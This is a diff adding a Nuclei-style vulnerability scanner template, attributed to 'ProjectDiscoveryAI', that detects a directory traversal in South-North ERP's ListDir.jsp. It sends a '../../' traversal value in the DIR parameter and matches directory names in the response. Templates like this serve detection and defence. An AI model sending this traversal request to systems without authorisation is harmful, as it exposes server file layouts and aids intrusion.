@@ -1,0 +1,30 @@
+id: snsoft-listdir-jsp-directory-traversal
+info:
+  name: South-North ERP ListDir.jsp Directory Traversal
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: directory-traversal
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/snsoft/tool/ListDir.jsp?DIR=../../"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "bin"
+          - "snconfig"
+          - "webapps"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: regex
+        part: header
+        regex:
+          - "/snsoft"
